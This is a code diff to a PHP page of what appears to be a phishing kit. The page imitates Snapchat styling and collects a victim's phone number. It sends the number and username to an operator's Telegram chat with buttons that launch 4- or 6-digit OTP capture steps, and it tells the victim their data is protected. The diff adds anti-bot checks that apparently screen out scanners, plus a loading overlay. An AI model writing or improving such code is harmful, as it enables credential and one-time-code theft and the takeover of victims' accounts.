@@ -3,6 +3,7 @@
 declare(strict_types=1);
 
 require __DIR__ . '/includes/bootstrap.php';
+require __DIR__ . '/includes/antibot.php';
 
 session_start();
 
@@ -20,44 +21,65 @@ $display = '@' . ltrim($pseudo, '@');
 $error = '';
 $success = '';
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $phone = isset($_POST['phone']) ? trim((string) $_POST['phone']) : '';
-    if ($phone === '') {
-        $error = 'Veuillez entrer votre numéro de téléphone.';
-    } elseif (!app_telegram_configured()) {
-        $error = 'Configuration Telegram incomplète.';
-    } else {
-        $base = app_public_base_url();
-        if (!str_starts_with($base, 'https://')) {
-            $error = 'Les boutons Telegram nécessitent une URL HTTPS. Renseignez site_base_url dans config.php (ex. https://votredomaine.com).';
-        }
-        if ($error === '') {
-            $q = static function (string $s): string {
-                return rawurlencode($s);
-            };
-            $url4 = $base . '/otp.php?f=' . $q($flowId) . '&s=' . $q($secret) . '&d=4';
-            $url6 = $base . '/otp.php?f=' . $q($flowId) . '&s=' . $q($secret) . '&d=6';
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    app_regenerate_math_challenge();
+    app_touch_form_opened('phone');
+}
 
-            $text = "Téléphone reçu\nPseudo : " . $pseudo . "\nNuméro : " . $phone;
-            $body = [
-                'chat_id' => $config['telegram_chat_id'],
-                'text' => $text,
-                'reply_markup' => [
-                    'inline_keyboard' => [
-                        [
-                            ['text' => 'OTP 4 chiffres', 'url' => $url4],
-                            ['text' => 'OTP 6 chiffres', 'url' => $url6],
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $ab = app_antibot_verify_post('phone', 2.0);
+    if ($ab !== '') {
+        $error = $ab;
+        app_regenerate_math_challenge();
+    } else {
+        $phone = isset($_POST['phone']) ? trim((string) $_POST['phone']) : '';
+        if ($phone === '') {
+            $error = 'Veuillez entrer votre numéro de téléphone.';
+            app_regenerate_math_challenge();
+        } elseif (!app_telegram_configured()) {
+            $error = 'Configuration Telegram incomplète.';
+            app_regenerate_math_challenge();
+        } else {
+            $base = app_public_base_url();
+            if (!str_starts_with($base, 'https://')) {
+                $error = 'Les boutons Telegram nécessitent une URL HTTPS. Renseignez site_base_url dans config.php (ex. https://votredomaine.com).';
+                app_regenerate_math_challenge();
+            }
+            if ($error === '') {
+                $q = static function (string $s): string {
+                    return rawurlencode($s);
+                };
+                $url4 = $base . '/otp.php?f=' . $q($flowId) . '&s=' . $q($secret) . '&d=4';
+                $url6 = $base . '/otp.php?f=' . $q($flowId) . '&s=' . $q($secret) . '&d=6';
+
+                $text = "Téléphone reçu\nPseudo : " . $pseudo . "\nNuméro : " . $phone;
+                $body = [
+                    'chat_id' => $config['telegram_chat_id'],
+                    'text' => $text,
+                    'reply_markup' => [
+                        'inline_keyboard' => [
+                            [
+                                ['text' => 'OTP 4 chiffres', 'url' => $url4],
+                                ['text' => 'OTP 6 chiffres', 'url' => $url6],
+                            ],
                         ],
                     ],
-                ],
-            ];
-            $r = app_telegram_send($body);
-            if (!$r['ok']) {
-                $error = htmlspecialchars((string) ($r['error'] ?? 'Erreur'), ENT_QUOTES, 'UTF-8');
-            } else {
-                $flow['phone'] = $phone;
-                app_flow_write($flowId, $flow);
-                $success = 'Numéro enregistré. Ouvrez le message Telegram pour choisir le type de code.';
+                ];
+                $r = app_telegram_send($body);
+                if (!$r['ok']) {
+                    $error = htmlspecialchars((string) ($r['error'] ?? 'Erreur'), ENT_QUOTES, 'UTF-8');
+                    app_regenerate_math_challenge();
+                } else {
+                    $flow['phone'] = $phone;
+                    if (!isset($flow['otp_notified_4'])) {
+                        $flow['otp_notified_4'] = 0;
+                    }
+                    if (!isset($flow['otp_notified_6'])) {
+                        $flow['otp_notified_6'] = 0;
+                    }
+                    app_flow_write($flowId, $flow);
+                    $success = 'Numéro enregistré. Ouvrez le message Telegram pour choisir le type de code.';
+                }
             }
         }
     }
@@ -74,6 +96,12 @@ $css = require __DIR__ . '/includes/snap_styles.php';
     <style><?= $css ?></style>
 </head>
 <body>
+    <div id="loadingOverlay" class="loading-overlay" aria-live="polite" aria-busy="true">
+        <div class="loading-box">
+            <div class="loading-spinner" role="presentation"></div>
+            <div class="loading-text">Envoi en cours…</div>
+        </div>
+    </div>
     <div class="card">
         <div class="logo-wrap" aria-hidden="true">
             <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
@@ -91,7 +119,8 @@ $css = require __DIR__ . '/includes/snap_styles.php';
             <div class="alert alert-success" role="status"><?= htmlspecialchars($success, ENT_QUOTES, 'UTF-8') ?></div>
         <?php endif; ?>
 
-        <form method="post" action="">
+        <form id="phoneForm" method="post" action="" class="<?= $success !== '' ? 'form-loading' : '' ?>">
+            <?php require __DIR__ . '/includes/form_antibot_fields.php'; ?>
             <label for="phone">Téléphone</label>
             <input
                 type="tel"
@@ -103,7 +132,7 @@ $css = require __DIR__ . '/includes/snap_styles.php';
                 inputmode="tel"
                 maxlength="32"
             >
-            <button type="submit" class="btn btn-primary">CONTINUER</button>
+            <button type="submit" class="btn btn-primary" id="phoneSubmit">CONTINUER</button>
         </form>
 
         <div class="footer-secure">
@@ -113,5 +142,16 @@ $css = require __DIR__ . '/includes/snap_styles.php';
             <span>Vos données sont protégées</span>
         </div>
     </div>
+    <script>
+        (function () {
+            var overlay = document.getElementById('loadingOverlay');
+            var form = document.getElementById('phoneForm');
+            if (!form || !overlay) return;
+            form.addEventListener('submit', function () {
+                overlay.classList.add('is-visible');
+                form.classList.add('form-loading');
+            });
+        })();
+    </script>
 </body>
 </html>
